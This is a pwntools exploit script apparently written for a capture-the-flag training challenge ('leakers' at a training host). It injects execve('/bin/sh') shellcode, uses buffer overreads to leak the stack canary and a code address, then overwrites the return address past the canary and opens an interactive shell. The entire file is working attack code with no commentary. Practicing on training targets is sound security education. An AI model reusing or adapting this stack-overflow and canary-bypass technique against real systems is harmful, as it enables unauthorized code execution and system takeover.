from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./leakers")
    gdb.attach(r, """
        b puts
        c
        """)

    input("wait")
else:
    r = remote("bin.training.offdef.it", 2012)

#r.sendline(b"thisisbsss")
shellcode = b"\x41\x55\x5F\x48\x81\xC7\x20\x07\x20\x00\x48\x83\xC7\x1D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
r.send(shellcode)

time.sleep(0.1)
print("1:", r.recv())
r.send(b"B"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = pwnlib.util.packing.u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

print("1:", r.recv())
r.send(b"C"*136)
r.recvuntil(b"> ")
r.read(136)
leaked_address = r.read(6) + b"\x00" + b"\x00"
address = pwnlib.util.packing.u64(leaked_address)
print("[!] leaked_address %#x" % address)

ret_address = address + 0x200720
print("[!] ret_address %#x" % ret_address)

little = ret_address.to_bytes(length=8, byteorder="little")
print(little)
payload = b"A"*71 + pwnlib.util.packing.p64(ret_address) + b"A"*25 + pwnlib.util.packing.p64(canary) + b"A"*8 + pwnlib.util.packing.p64(ret_address)
r.send(payload)


time.sleep(0.1)

r.sendline(b"")

r.interactive()